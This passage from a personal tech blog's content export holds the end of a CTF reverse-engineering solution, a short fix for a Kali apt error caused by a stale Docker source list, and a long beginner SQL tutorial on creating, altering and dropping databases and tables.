&#123;<span class="number">50</span>, <span class="number">145</span>, <span class="number">242</span>, <span class="number">166</span>, <span class="number">198</span>, <span class="number">128</span>, <span class="number">32</span>, <span class="number">9</span>, <span class="number">222</span>, <span class="number">204</span>, <span class="number">87</span>, <span class="number">158</span>, <span class="number">160</span>, <span class="number">147</span>, <span class="number">155</span>, <span class="number">82</span>, <span class="number">71</span>, <span class="number">9</span>, <span class="number">38</span>, <span class="number">246</span>, <span class="number">0</span>, <span class="number">88</span>, <span class="number">185</span>, <span class="number">225</span>, <span class="number">62</span>, <span class="number">226</span>, <span class="number">31</span>, <span class="number">171</span>, <span class="number">199</span>, <span class="number">245</span>, <span class="number">106</span>, <span class="number">31</span>&#125;;</span><br><span class="line">    btea((uint32_t*)buf,-<span class="number">8</span>,(uint32_t*)secret);</span><br><span class="line">    <span class="keyword">for</span>(<span class="built_in">int</span> j=<span class="number">0</span>;j&lt;<span class="number">32</span>;j++)</span><br><span class="line">        printf(<span class="string">&quot;%c&quot;</span>,buf[j]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Writeup</category>
      </categories>
      <tags>
        <tag>Crypto</tag>
        <tag>Web</tag>
        <tag>Misc</tag>
        <tag>Pwn</tag>
        <tag>Reverse</tag>
        <tag>Writeup</tag>
      </tags>
  </entry>
  <entry>
    <title>kali升级报错没有 Release 文件</title>
    <url>/2022/09/06/kail%E5%8D%87%E7%BA%A7%E6%8A%A5%E9%94%99%EF%BC%9AE%20%E4%BB%93%E5%BA%93%20%E2%80%9Chttpsdownload.docker.comlinuxdebian%20kali-rolling%20Release%E2%80%9D%20%E6%B2%A1%E6%9C%89%20Release%20%E6%96%87%E4%BB%B6%E3%80%82/</url>
    <content><![CDATA[<p>写在前面，这是我在使用kali的过程中遇到的问题</p>
<span id="more"></span>
<h4 id="问题"><a class="markdownIt-Anchor" href="#问题"></a> 问题</h4>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root@root:~# sudo apt update 命中:1 http://mirrors.ustc.edu.cn/kali kali-rolling InRelease 忽略:2 https://download.docker.com/linux/debian kali-rolling InRelease 错误:3 https://download.docker.com/linux/debian kali-rolling Release  404  Not Found [IP: 65.8.85.83 443] 正在读取软件包列表... 完成 E: 仓库 “https://download.docker.com/linux/debian kali-rolling Release” 没有 Release 文件。 N: 无法安全地用该源进行更新，所以默认禁用该源。 N: 参见 apt-secure(8) 手册以了解仓库创建和用户配置方面的细节。</span><br></pre></td></tr></table></figure>
<h4 id="解决办法"><a class="markdownIt-Anchor" href="#解决办法"></a> 解决办法</h4>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root@root:~# cd /etc/apt/sources.list.d</span><br><span class="line">root@root:/etc/apt/sources.list.d# ls</span><br><span class="line">docker.list</span><br><span class="line">root@root:/etc/apt/sources.list.d# rm docker.list </span><br><span class="line">root@root:/etc/apt/sources.list.d# apt-get update &amp;&amp; apt-get upgrade</span><br></pre></td></tr></table></figure>
<p>好耶散花！QWQ</p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>SQL-增删改查</title>
    <url>/2022/09/02/SQL-%E5%A2%9E%E5%88%A0%E6%94%B9%E6%9F%A5/</url>
    <content><![CDATA[<p>Do u know Create and Drop Database, Create, Alter and Drop Tables, Select, Insert, Update, Delete Commands.</p>
<span id="more"></span>
<h2 id="introduction-descriptive"><a class="markdownIt-Anchor" href="#introduction-descriptive"></a> Introduction (Descriptive)</h2>
<p>Content:- Creating and Maintaining Tables, Objectives, The CREATE DATABASE Statement, CREATE DATABASE Options, Database Design, Creating a Data Dictionary, Creating Key Fields, The CREATE TABLE Statement, The Table Name, The Field Name, The Field’s Data Type, The NULL Value, Table Storage and Sizing, Creating a Table from an Existing Table, The ALTER TABLE Statement, The DROP TABLE Statement, The DROP DATABASE Statement.</p>
<h2 id="details"><a class="markdownIt-Anchor" href="#details"></a> Details</h2>
<p>It covers the <strong>CREATE DATABASE</strong>, <strong>CREATE TABLE</strong>, <strong>ALTER TABLE</strong>, <strong>DROP TABLE</strong>, and <strong>DROP DATABASE</strong> statements, which are collectively known as data definition statements. (In contrast, the <strong>SELECT</strong>, <strong>UPDATE</strong>, <strong>INSERT</strong>, and <strong>DELETE</strong> statements are often described as data manipulation statements.) By the end, you will understand and be able to do the following:</p>
<ul>
<li>Create key fields</li>
<li>Create a database with its associated tables</li>
<li>Create, alter, and drop a table</li>
<li>Add data to the database</li>
<li>Modify the data in a database</li>
<li>Drop databases</li>
</ul>
<p>The syntax of the <strong>CREATE</strong> statements can range from the extremely simple to the complex, depending on the options your database management system (DBMS) supports and how detailed you want to be when building a database.</p>
<p><strong>NOTE:</strong> The examples used today were generated using Personal Oracle7. Please see the documentation for your specific SQL implementation for any minor differences in syntax.</p>
<h2 id="the-create-database-statement"><a class="markdownIt-Anchor" href="#the-create-database-statement"></a> <strong>The CREATE DATABASE Statement</strong></h2>
<p>The first data management step in any database project is to create the database. This task can range from the elementary to the complicated, depending on your needs and the database management system you have chosen. Many modern systems (including Personal Oracle7) include graphical tools that enable you to completely build the database with the click of a mouse button. This time-saving feature is certainly helpful, but you should understand the SQL statements that execute in response to the mouse clicks.</p>
<p>Through personal experience, we have learned the importance of creating a good SQL install script. This script file contains the necessary SQL code to completely rebuild a database or databases; the script often includes database objects such as indexes, stored procedures, and triggers. You will see the value of this script during development as you continually make changes to the underlying database and on occasion want to completely rebuild the database with all the latest changes. Using the graphical tools each time you need to perform a rebuild can become extremely time-consuming. In addition, knowing the SQL syntax for this procedure enables you to apply your knowledge to other database systems.</p>
<p>The syntax for the typical <strong>CREATE DATABASE</strong> statement looks like this:</p>
<p><strong>SYNTAX:</strong></p>
<p>CREATE DATABASE database_name</p>
<p>Because the syntax varies so widely from system to system, we will not expand on the <strong>CREATE DATABASE</strong> statement’s syntax. Many systems do not even support an SQL <strong>CREATE DATABASE</strong> command. However, all the popular, more powerful, relational database management systems (RDBMSs) do provide it. Instead of focusing on its syntax, we will spend some time discussing the options to consider when creating a database.</p>
<h2 id="create-database-options"><a class="markdownIt-Anchor" href="#create-database-options"></a> <strong>CREATE DATABASE Options</strong></h2>
<p>The syntax for the <strong>CREATE DATABASE</strong> statement can vary widely. Many SQL texts skip over the <strong>CREATE DATABASE</strong> statement and move directly on to the <strong>CREATE TABLE</strong> statement. Because you must create a database before you can build a table, this section focuses on some of the concepts a developer must consider when building a database. The first consideration is your level of permission. If you are using a relational database management system (RDBMS) that supports user permissions, you must make sure that either you have system administrator-level permission settings or the system administrator has granted you <strong>CREATE DATABASE</strong> permission. Refer to your RDBMS documentation for more information.</p>
<p>Most RDBMSs also allow you to specify a default database size, usually in terms of hard disk space (such as megabytes). You will need to understand how your database system stores and locates data on the disk to accurately estimate the size you need. The responsibility for managing this space falls primarily to system administrators, and possibly at your location a database administrator will build you a test database.</p>
<p>Don’t let the <strong>CREATE DATABASE</strong> statement intimidate you. At its simplest, you can create a database named <strong>PAYMENTS</strong> with the following statement:</p>
<p><strong>SYNTAX:</strong></p>
<p>SQL&gt; <strong>CREATE DATABASE PAYMENTS;</strong></p>
<p><strong>NOTE:</strong> Again, be sure to consult your database management system’s documentation to learn the specifics of building a database, as the <strong>CREATE DATABASE</strong> statement can and does vary for the different implementations. Each implementation also has some unique options.</p>
<p><strong>Database Design</strong></p>
<p><em>Normalization</em> is the process of breaking your data into separate components to reduce the repetition of data. Each level of normalization reduces the repetition of data. Normalizing your data can be an extremely complex process, and numerous database design tools enable you to plan this process in a logical fashion. Many factors can influence the design of your database, including the following:</p>
<p><strong>Security</strong></p>
<ul>
<li>Disk space available</li>
<li>Speed of database searches and retrievals</li>
<li>Speed of database updates</li>
<li>Speed of multiple-table joins to retrieve data</li>
<li>RDBMS support for temporary tables</li>
</ul>
<p>Disk space is always an important factor. Although you may not think that disk space is a major concern in an age of multigigabyte storage, remember that the bigger your database is, the longer it takes to retrieve records. If you have done a poor job of designing your table structure, chances are that you have needlessly repeated much of your data.</p>
<p>Often the opposite problem can occur. You may have sought to completely normalize your tables’ design with the database and in doing so created many tables. Although you may have approached database-design nirvana, any query operations done against this database may take a very long time to execute. Databases designed in this manner are sometimes difficult to maintain because the table structure might obscure the designer’s intent. This problem underlines the importance of always documenting your code or design so that others can come in after you (or work with you) and have some idea of what you were thinking at the time you created your database structure. In database designer’s terms, this documentation is known as a data dictionary.</p>
<h2 id="creating-a-data-dictionary"><a class="markdownIt-Anchor" href="#creating-a-data-dictionary"></a> <strong>Creating a Data Dictionary</strong></h2>
<p>A data dictionary is the database designer’s most important form of documentation. It performs the following functions:</p>
<ul>
<li>Describes the purpose of the database and who will be using it.</li>
<li>Documents the specifics behind the database itself: what device it was created on, the database’s default size, or the size of the log file (used to store database operations information in some RDBMSs).</li>
<li>Contains SQL source code for any database install or uninstall scripts, including documentation on the use of import/export tools.</li>
<li>Provides a detailed description of each table within the database and explains its purpose in business process terminology.</li>
<li>Documents the internal structure of each table, including all fields and their data types with comments, all indexes, and all views.</li>
<li>Contains SQL source code for all stored procedures and triggers.</li>
<li>Describes database constraints such as the use of unique values or <strong>NOT NULL</strong> values. The documentation should also mention whether these constraints are enforced at the RDBMS level or whether the database programmer is expected to check for these constraints within the source code.</li>
</ul>
<p>Many computer-aided software engineering (CASE) tools aid the database designer in the creation of this data dictionary. For instance, Microsoft Access comes prepackaged with a database documenting tool that prints out a detailed description of every object in the database.</p>
<p><strong>NOTE:</strong> Most of the major RDBMS packages come with either the data dictionary installed or scripts to install it.</p>
<h2 id="creating-key-fields"><a class="markdownIt-Anchor" href="#creating-key-fields"></a> <strong>Creating Key Fields</strong></h2>
<p>Along with documenting your database design, the most important design goal you should have is to create your table structure so that each table has a primary key and a foreign key. The primary key should meet the following goals:</p>
<ul>
<li>Each record is unique within a table (no other record within the table has all of its columns equal to any other).</li>
<li>For a record to be unique, all the columns are necessary; that is, data in one column should not be repeated anywhere else in the table.</li>
</ul>
<p>Regarding the second goal, the column that has completely unique data throughout the table is known as the <em>primary key field</em>. A <em>foreign key field</em> is a field that links one table to another table’s primary or foreign key. The following example should clarify this situation.</p>
<p>Assume you have three tables: <strong>BILLS</strong>, <strong>BANK_ACCOUNTS</strong>, and <strong>COMPANY</strong>. Table 9.1 shows the format of these three tables.</p>
<p><strong>Table 9.1. Table structure for the PAYMENTS database.</strong></p>
<p><img src="https://img-blog.csdnimg.cn/54613e7278674249b4a08a642a66837b.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>Take a moment to examine these tables. Which fields do you think are the primary keys? Which are the foreign keys?</p>
<p>The primary key in the <strong>BILLS</strong> table is the <strong>NAME</strong> field. This field should not be duplicated because you have only one bill with this amount. (In reality, you would probably have a check number or a date to make this record truly unique, but assume for now that the <strong>NAME</strong> field works.) The <strong>ACCOUNT_ID</strong> field in the <strong>BANK_ACCOUNTS</strong> table is the primary key for that table. The <strong>NAME</strong> field is the primary key for the <strong>COMPANY</strong> table.</p>
<p>The foreign keys in this example are probably easy to spot. The <strong>ACCOUNT_ID</strong> field in the <strong>BILLS</strong> table joins the <strong>BILLS</strong> table with the <strong>BANK_ACCOUNTS</strong> table. The <strong>NAME</strong> field in the <strong>BILLS</strong> table joins the <strong>BILLS</strong> table with the <strong>COMPANY</strong> table. If this were a full-fledged database design, you would have many more tables and data breakdowns. For instance, the <strong>BANK</strong> field in the <strong>BANK_ACCOUNTS</strong> table could point to a <strong>BANK</strong> table containing bank information such as addresses and phone numbers. The <strong>COMPANY</strong> table could be linked with another table (or database for that matter) containing information about the company and its products.</p>
<p><strong>Exercise 9.1</strong></p>
<p>Let’s take a moment to examine an incorrect database design using the same information contained in the <strong>BILLS</strong>, <strong>BANK_ACCOUNTS</strong>, and <strong>COMPANY</strong> tables. A mistake many beginning users make is not breaking down their data into as many logical groups as possible. For instance, one poorly designed <strong>BILLS</strong> table might look like this:</p>
<p><img src="https://img-blog.csdnimg.cn/75dd3c28420b4db7af3b8291bcf7bb97.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p><img src="https://img-blog.csdnimg.cn/7047a6fada8f4a6ba3ea2083f2961ea8.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>The results may look correct, but take a moment to really look at the data here. If over several months you wrote several bills to the company in the <strong>NAME</strong> field, each time a new record was added for a bill, the company’s <strong>ADDRESS</strong>, <strong>CITY</strong>, and <strong>STATE</strong> information would be duplicated. Now multiply that duplication over several hundred or thousand records and then multiply that figure by 10, 20, or 30 tables. You can begin to see the importance of a properly normalized database.</p>
<p>Before you actually fill these tables with data, you will need to know how to create a table.</p>
<h2 id="the-create-table-statement"><a class="markdownIt-Anchor" href="#the-create-table-statement"></a> <strong>The CREATE TABLE Statement</strong></h2>
<p>The process of creating a table is far more standardized than the <strong>CREATE DATABASE</strong> statement. Here’s the basic syntax for the <strong>CREATE TABLE</strong> statement:</p>
<p><strong>SYNTAX:</strong></p>
<p>CREATE TABLE table_name</p>
<p>( field1 datatype [ NOT NULL ],</p>
<p>field2 datatype [ NOT NULL ],</p>
<p>field3 datatype [ NOT NULL ]…)</p>
<p>A simple example of a <strong>CREATE TABLE</strong> statement follows</p>
<p><strong>INPUT/OUTPUT:</strong></p>
<p>SQL&gt; <strong>CREATE TABLE BILLS (</strong></p>
<p>2 <strong>NAME CHAR(30),</strong></p>
<p>3 <strong>AMOUNT NUMBER,</strong></p>
<p>4 <strong>ACCOUNT_ID NUMBER);</strong></p>
<p>Table created.</p>
<p><strong>ANALYSIS:</strong></p>
<p>This statement creates a table named <strong>BILLS</strong>. Within the <strong>BILLS</strong> table are three fields: <strong>NAME</strong>, <strong>AMOUNT</strong>, and <strong>ACCOUNT_ID</strong>. The <strong>NAME</strong> field has a data type of character and can store strings up to 30 characters long. The <strong>AMOUNT</strong> and <strong>ACCOUNT_ID</strong> fields can contain number values only.</p>
<p>The following section examines components of the <strong>CREATE TABLE</strong> command.</p>
<h3 id="the-table-name"><a class="markdownIt-Anchor" href="#the-table-name"></a> <strong>The Table Name</strong></h3>
<p>When creating a table using Personal Oracle7, several constraints apply when naming the table. First, the table name can be no more than 30 characters long. Because Oracle is case insensitive, you can use either uppercase or lowercase for the individual characters. However, the first character of the name must be a letter between <strong>A</strong> and <strong>Z</strong>. The remaining characters can be letters or the symbols <strong>_</strong>, <strong>#</strong>, <strong>$</strong>, and <strong>@</strong>. Of course, the table name must be unique within its schema. The name also cannot be one of the Oracle or SQL reserved words (such as <strong>SELECT</strong>).</p>
<p><strong>NOTE:</strong> You can have duplicate table names as long as the owner or schema is different. Table names in the same schema must be unique.</p>
<h3 id="the-field-name"><a class="markdownIt-Anchor" href="#the-field-name"></a> <strong>The Field Name</strong></h3>
<p>The same constraints that apply to the table name also apply to the field name. However, a field name can be duplicated within the database. The restriction is that the field name must be unique within its table. For instance, assume that you have two tables in your database: <strong>TABLE1</strong>and <strong>TABLE2</strong>. Both of these tables could have fields called ID. You cannot, however, have two fields within <strong>TABLE1</strong> called <strong>ID</strong>, even if they are of different data types.</p>
<h3 id="the-fields-data-type"><a class="markdownIt-Anchor" href="#the-fields-data-type"></a> <strong>The Field’s Data Type</strong></h3>
<p>If you have ever programmed in any language, you are familiar with the concept of data types, or the type of data that is to be stored in a specific field. For instance, a character data type constitutes a field that stores only character string data. Table 9.2 shows the data types supported by Personal Oracle7.</p>
<p><strong>Table 9.2. Data types supported by Personal Oracle7.</strong></p>
<p><img src="https://img-blog.csdnimg.cn/96c27bf2f8294ddd95fdbb552a7c9071.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p><img src="https://img-blog.csdnimg.cn/97d769dab67f44fba0b88e7a2f110dd1.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p><strong>NOTE:</strong> The <strong>LONG</strong> data type is often called a <strong>MEMO</strong> data type in other database management systems. It is primarily used to store large amounts of text for retrieval at some later time.</p>
<p>The <strong>LONG RAW</strong> data type is often called a binary large object (<strong>BLOB</strong>) in other database management systems. It is typically used to store graphics, sound, or video data. Although relational database management systems were not originally designed to serve this type of data, many multimedia systems today store their data in <strong>LONG RAW</strong>, or <strong>BLOB</strong>, fields.</p>
<p>The <strong>ROWID</strong> field type is used to give each record within your table a unique, no duplicating value. Many other database systems support this concept with a <strong>COUNTER</strong> field (Microsoft Access) or an <strong>IDENTITY</strong> field (SQL Server).</p>
<p><strong>NOTE:</strong> Check your implementation for supported data types as they may vary.</p>
<h3 id="the-null-value"><a class="markdownIt-Anchor" href="#the-null-value"></a> <strong>The NULL Value</strong></h3>
<p>SQL also enables you to identify what can be stored within a column. A <strong>NULL</strong> value is almost an oxymoron, because having a field with a value of <strong>NULL</strong> means that the field actually has no value stored in it.</p>
<p>When building a table, most database systems enable you to denote a column with the <strong>NOT NULL</strong> keywords. <strong>NOT NULL</strong> means the column cannot contain any <strong>NULL</strong> values for any records in the table. Conversely, <strong>NOT NULL</strong> means that every record must have an actual value in this column. The following example illustrates the use of the <strong>NOT NULL</strong> keywords.</p>
<p><strong>INPUT:</strong></p>
<p>SQL&gt; <strong>CREATE TABLE BILLS (</strong></p>
<p>2 <strong>NAME CHAR(30) NOT NULL,</strong></p>
<p>3 <strong>AMOUNT NUMBER,</strong></p>
<p>4 <strong>ACCOUNT_ID NOT NULL);</strong></p>
<p><strong>ANALYSIS:</strong></p>
<p>In this table you want to save the name of the company you owe the money to, along with the bill’s amount. If the <strong>NAME</strong> field and/or the <strong>ACCOUNT_ID</strong> were not stored, the record would be meaningless. You would end up with a record with a bill, but you would have no idea whom you should pay.</p>
<p>The first statement in the next example inserts a valid record containing data for a bill to be sent to Joe’s Computer Service for $25.</p>
<p><strong>INPUT/OUTPUT:</strong></p>
<p>SQL&gt; <strong>INSERT INTO BILLS VALUES(“Joe’s Computer Service”, 25, 1);</strong></p>
<p>1 row inserted.</p>
<p><strong>INPUT/OUTPUT:</strong></p>
<p>SQL&gt; <strong>INSERT INTO BILLS VALUES(“”, 25000, 1);</strong></p>
<p>1 row inserted.</p>
<p><strong>ANALYSIS:</strong></p>
<p>Notice that the second record in the preceding example does not contain a <strong>NAME</strong> value. (You might think that a missing payee is to your advantage because the bill amount is $25,000, but we won’t consider that.) If the table had been created with a <strong>NOT NULL</strong> value for the <strong>NAME</strong> field, the second insert would have raised an error.</p>
<p>A good rule of thumb is that the primary key field and all foreign key fields should never contain <strong>NULL</strong> values.</p>
<p><strong>Unique Fields</strong></p>
<p>One of your design goals should be to have one unique column within each table. This column or field is a primary key field. Some database management systems allow you to set a field as unique. Other database management systems, such as Oracle and SQL Server, allow you to create a unique index on a field. This feature keeps you from inserting duplicate key field values into the database.</p>
<p>You should notice several things when choosing a key field. As we mentioned, Oracle provides a <strong>ROWID</strong> field that is incremented for each row that is added, which makes this field by default always a unique key. <strong>ROWID</strong> fields make excellent key fields for several reasons. First, it is much faster to join on an integer value than on an 80- character string. Such joins result in smaller database sizes over time if you store an integer value in every primary and foreign key as opposed to a long <strong>CHAR</strong> value. Another advantage is that you can use <strong>ROWID</strong> fields to see how a table is organized. Also, using <strong>CHAR</strong> values leaves you open to a number of data entry problems. For instance, what would happen if one person entered <strong>111 First Street</strong>, another entered <strong>111 1st Street</strong>, and yet another entered <strong>111 First St.</strong>? With today’s graphical user environments, the correct string could be entered into a list box. When a user makes a selection from the list box, the code would convert this string to a unique ID and save this ID to the database.</p>
<p>Now you can create the tables you used earlier today. You will use these tables for the rest of today, so you will want to fill them with some data. Use the <strong>INSERT</strong> command covered yesterday to load the tables with the data in Tables 9.3, 9.4, and 9.5.</p>
<p><strong>INPUT/OUTPUT:</strong></p>
<p>SQL&gt; <strong>create database PAYMENTS;</strong></p>
<p>Statement processed.</p>
<p>SQL&gt; <strong>create table BILLS (</strong></p>
<p>2 <strong>NAME CHAR(30) NOT NULL,</strong></p>
<p>3 <strong>AMOUNT NUMBER,</strong></p>
<p>4 <strong>ACCOUNT_ID NUMBER NOT NULL);</strong></p>
<p>Table created.</p>
<p>SQL&gt; <strong>create table BANK_ACCOUNTS (</strong></p>
<p>2 <strong>ACCOUNT_ID NUMBER NOT NULL,</strong></p>
<p>3 <strong>TYPE CHAR(30),</strong></p>
<p>4 <strong>BALANCE NUMBER,</strong></p>
<p>5 <strong>BANK CHAR(30));</strong></p>
<p>Table created.</p>
<p>SQL&gt; <strong>create table COMPANY (</strong></p>
<p>2 <strong>NAME CHAR(30) NOT NULL,</strong></p>
<p>3 <strong>ADDRESS CHAR(50),</strong></p>
<p>4 <strong>CITY CHAR(30),</strong></p>
<p>5 <strong>STATE CHAR(2));</strong></p>
<p>Table created.</p>
<p><strong>Table 9.3. Sample data for the BILLS table.</strong></p>
<p><img src="https://img-blog.csdnimg.cn/0d2c47a1014d4410b1914a93640728cc.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p><strong>Table 9.4. Sample data for the BANK_ACCOUNTS table.</strong></p>
<p><img src="https://img-blog.csdnimg.cn/0e80211dce534627935aeb2437501c74.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p><strong>Table 9.5. Sample data for the COMPANY table.</strong></p>
<p><img src="https://img-blog.csdnimg.cn/458ba3ffdf17401ba0fed78e6c46207f.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p><strong>Table Storage and Sizing</strong></p>
<p>Most major RDBMSs have default settings for table sizes and table locations. If you do not specify table size and location, then the table will take the defaults. The defaults may be very undesirable, especially for large tables. The default sizes and locations will vary among the implementations. Here is an example of a <strong>CREATE TABLE</strong> statement with a storage clause (from Oracle).</p>
<p><strong>INPUT:</strong></p>
<p>SQL&gt; <strong>CREATE TABLE TABLENAME</strong></p>
<p>2 <strong>(COLUMN1 CHAR NOT NULL,</strong></p>
<p>3 <strong>COLUMN2 NUMBER,</strong></p>
<p>4 <strong>COLUMN3 DATE)</strong></p>
<p>5 <strong>TABLESPACE TABLESPACE NAME</strong></p>
<p>6 <strong>STORAGE</strong></p>
<p>7 <strong>INITIAL SIZE,</strong></p>
<p>8 <strong>NEXT SIZE,</strong></p>
<p>9 <strong>MINEXTENTS value,</strong></p>
<p>10 <strong>MAXEXTENTS value,</strong></p>
<p>11 <strong>PCTINCREASE value);</strong></p>
<p><strong>OUTPUT:</strong></p>
<p>Table created.</p>
<p><strong>ANALYSIS:</strong></p>
<p>In Oracle you can specify a tablespace in which you want the table to reside. A decision is usually made according to the space available, often by the database administrator (DBA). <strong>INITIAL SIZE</strong> is the size for the initial extent of the table (the initial allocated space). <strong>NEXT SIZE</strong> is the value for any additional extents the table may take through growth. <strong>MINEXTENTS</strong> and <strong>MAXEXTENTS</strong> identify the minimum and maximum extents allowed for the table, and <strong>PCTINCREASE</strong> identifies the percentage the next extent will be increased each time the table grows, or takes another extent.</p>
<p><strong>Creating a Table from an Existing Table</strong></p>
<p>The most common way to create a table is with the <strong>CREATE TABLE</strong> command. However, some database management systems provide an alternative method of creating tables, using the format and data of an existing table. This method is useful when you want to select the data out of a table for temporary modification. It can also be useful when you have to create a table similar to the existing table and fill it with similar data. (You won’t have to reenter all this information.) The syntax for Oracle follows.</p>
<p><strong>SYNTAX:</strong></p>
<p>CREATE TABLE NEW_TABLE(FIELD1, FIELD2, FIELD3)</p>
<p>AS (SELECT FIELD1, FIELD2, FIELD3</p>
<p>FROM OLD_TABLE &lt;WHERE…&gt;</p>
<p>This syntax allows you to create a new table with the same data types as those of the fields that are selected from the old table. It also allows you to rename the fields in the new table by giving them new names.</p>
<p><strong>INPUT/OUTPUT:</strong></p>
<p>SQL&gt; <strong>CREATE TABLE NEW_BILLS(NAME, AMOUNT, ACCOUNT_ID)</strong></p>
<p>2 <strong>AS (SELECT * FROM BILLS WHERE AMOUNT &lt; 50);</strong></p>
<p>Table created.</p>
<p><strong>ANALYSIS:</strong></p>
<p>The preceding statement creates a new table (<strong>NEW_BILLS</strong>) with all the records from the <strong>BILLS</strong> table that have an <strong>AMOUNT</strong> less than <strong>50</strong>.</p>
<p>Some database systems also allow you to use the following syntax:</p>
<p><strong>SYNTAX:</strong></p>
<p>INSERT NEW_TABLE</p>
<p>SELECT &lt;field1, field2… | *&gt; from OLD_TABLE</p>
<p>&lt;WHERE…&gt;</p>
<p>The preceding syntax would create a new table with the exact field structure and data found in the old table. Using SQL Server’s Transact-SQL language in the following example illustrates this technique.</p>
<p><strong>INPUT:</strong></p>
<p><strong>INSERT NEW_BILLS</strong></p>
<p>1&gt; <strong>select * from BILLS where AMOUNT &lt; 50</strong></p>
<p>2&gt; <strong>go</strong></p>
<p>(The <strong>GO</strong> statement in SQL Server processes the SQL statements in the command buffer. It is equivalent to the semicolon (<strong>;</strong>) used in Oracle7.)</p>
<p><strong>The ALTER TABLE Statement</strong></p>
<p>Many times your database design does not account for everything it should. Also, requirements for applications and databases are always subject to change. The <strong>ALTER TABLE</strong> statement enables the database administrator or designer to change the structure of a table after it has been created.</p>
<p>The <strong>ALTER TABLE</strong> command enables you to do two things:</p>
<ul>
<li>Add a column to an existing table</li>
<li>Modify a column that already exists</li>
</ul>
<p>The syntax for the <strong>ALTER TABLE</strong> statement is as follows:</p>
<p><strong>SYNTAX:</strong></p>
<p>ALTER TABLE table_name</p>
<p>&lt;ADD column_name data_type; |</p>
<p>MODIFY column_name data_type;&gt;</p>
<p>The following command changes the <strong>NAME</strong> field of the <strong>BILLS</strong> table to hold 40</p>
<p>characters:</p>
<p><strong>INPUT/OUTPUT:</strong></p>
<p>SQL&gt; <strong>ALTER TABLE BILLS</strong></p>
<p>2 <strong>MODIFY NAME CHAR(40);</strong></p>
<p>Table altered.</p>
<p><strong>NOTE:</strong> You can increase or decrease the length of columns; however, you can not decrease a column’s length if the current size of one of its values is greater than the value you want to assign to the column length.</p>
<p>Here’s a statement to add a new column to the <strong>NEW_BILLS</strong> table:</p>
<p><strong>INPUT/OUTPUT:</strong></p>
<p>SQL&gt; <strong>ALTER TABLE NEW_BILLS</strong></p>
<p>2 <strong>ADD COMMENTS CHAR(80);</strong></p>
<p>Table altered.</p>
<p><strong>ANALYSIS:</strong></p>
<p>This statement would add a new column named <strong>COMMENTS</strong> capable of holding 80 characters. The field would be added to the right of all the existing fields.</p>
<p>Several restrictions apply to using the <strong>ALTER TABLE</strong> statement. You cannot use it to add or delete fields from a database. It can change a column from <strong>NOT NULL</strong> to <strong>NULL</strong>, but not necessarily the other way around. A column specification can be changed from <strong>NULL</strong> to <strong>NOT NULL</strong> only if the column does not contain any <strong>NULL</strong> values. To change a column from <strong>NOT NULL</strong> to <strong>NULL</strong>, use the following syntax:</p>
<p><strong>SYNTAX:</strong></p>
<p>ALTER TABLE table_name MODIFY (column_name data_type NULL);</p>
<p>To change a column from <strong>NULL</strong> to <strong>NOT NULL</strong>, you might have to take several steps:</p>
<p><strong>1.</strong> Determine whether the column has any <strong>NULL</strong> values.</p>
<p><strong>2.</strong> Deal with any <strong>NULL</strong> values that you find. (Delete those records; update the column’s value, and so on.)</p>
<p><strong>3.</strong> Issue the <strong>ALTER TABLE</strong> command.</p>
<p><strong>NOTE:</strong> Some database management systems allow the use of the <strong>MODIFY</strong> Clause; others do not. Still others have added other clauses to the <strong>ALTER TABLE</strong> statement. In Oracle, you can even alter the table’s storage parameters. Check the documentation of the system you are using to determine the implementation of the <strong>ALTER TABLE</strong> statement.</p>
<p><strong>The DROP TABLE Statement</strong></p>
<p>SQL provides a command to completely remove a table from a database. The <strong>DROP TABLE</strong> command deletes a table along with all its associated views and indexes. After this command has been issued, there is no turning back. The most common use of the <strong>DROP TABLE</strong> statement is when you have created a table for temporary use. When you have completed all operations on the table that you planned to do, issue the <strong>DROP TABLE</strong> statement with the following syntax:</p>
<p><strong>SYNTAX:</strong></p>
<p>DROP TABLE table_name;</p>
<p>Here’s how to drop the <strong>NEW_BILLS</strong> table:</p>
<p><strong>INPUT/OUTPUT:</strong></p>
<p>SQL&gt; <strong>DROP TABLE NEW_BILLS;</strong></p>
<p>Table dropped.</p>
<p><strong>ANALYSIS:</strong></p>
<p>Notice the absence of system prompts. This command did not ask <strong>Are you sure? (Y/N)</strong>. After the <strong>DROP TABLE</strong> command is issued, the table is permanently deleted.</p>
<p><strong>WARNING:</strong> If you issue</p>
<p>SQL&gt; DROP TABLE NEW_BILLS;</p>
<p>you could be dropping the incorrect table. When dropping tables, you should always use the owner or schema name. The recommended syntax is</p>
<p>SQL&gt; DROP TABLE OWNER.NEW_BILLS;</p>
<p>We are stressing this syntax because we once had to repair a production database from which the wrong table had been dropped. The table was not properly identified with the schema name. Restoring the database was an eight-hour job, and we had to work until well past midnight.</p>
<p><strong>The DROP DATABASE Statement</strong></p>
